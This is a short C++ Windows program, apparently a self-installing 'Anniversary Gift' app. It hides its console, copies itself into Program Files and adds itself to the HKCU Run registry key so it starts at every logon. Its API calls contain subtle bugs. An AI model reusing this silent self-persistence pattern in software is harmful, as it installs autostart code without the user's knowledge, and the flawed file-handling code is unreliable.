#include <Windows.h>
#include <iostream>
#include <direct.h>
#include <string>
#pragma warning(disable : 4996)

bool writeToFile(HANDLE readFile, HANDLE writeFile)
{
	DWORD filesize = GetFileSize(readFile, NULL);
	CHAR* pbuffer = new CHAR[filesize];
	if (!ReadFile(readFile, pbuffer, filesize, NULL, NULL))
	{
		return false;
	}
	if (!WriteFile(writeFile, pbuffer, filesize, NULL, NULL))
	{
		return false;
	}
	delete[] pbuffer;
	return true;
}

int main()
{
	HANDLE hfile1, hfile2;
	wchar_t ownPath[MAX_PATH];
	PCWSTR dictname = L"C:\\Program Files\\Anniversary Gift";
	PCWSTR filename = L"C:\\Program Files\\Anniversary Gift\\gift.exe";
	HKEY openRun = nullptr;

	FreeConsole();
	hfile1 = CreateFile(dictname, READ_CONTROL, NULL, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
	if (hfile1 == INVALID_HANDLE_VALUE) // first time running the program
	{
		mkdir("C:\\Program Files\\Anniversary Gift"); // creating new folder in program files

		hfile1 = CreateFile(filename, GENERIC_WRITE, NULL, NULL, OPEN_ALWAYS, FILE_FLAG_BACKUP_SEMANTICS, NULL);
		if (hfile1 == INVALID_HANDLE_VALUE) // error opening file
		{
			return 1;
		}

		GetModuleFileName(NULL, ownPath, sizeof(ownPath));

		hfile2 = CreateFile(ownPath, GENERIC_READ, NULL, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hfile2 == INVALID_HANDLE_VALUE)
		{
			return 1;
		}

		if (!writeToFile(hfile2, hfile1))
		{
			return 1;
		}

		CloseHandle(hfile2);

		if (RegOpenKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &openRun) != ERROR_SUCCESS)
		{
			return 1;
		}

		if (RegSetValueEx(openRun, L"AnniGift", 0, REG_SZ, (LPBYTE)L"C:\\Program Files\\Anniversary Gift\\gift.exe", MAX_PATH) != ERROR_SUCCESS)
		{
			return 1;
		}

		RegCloseKey(openRun);

	}

	CloseHandle(hfile1);

	// logic for window itself

	return 0;
}
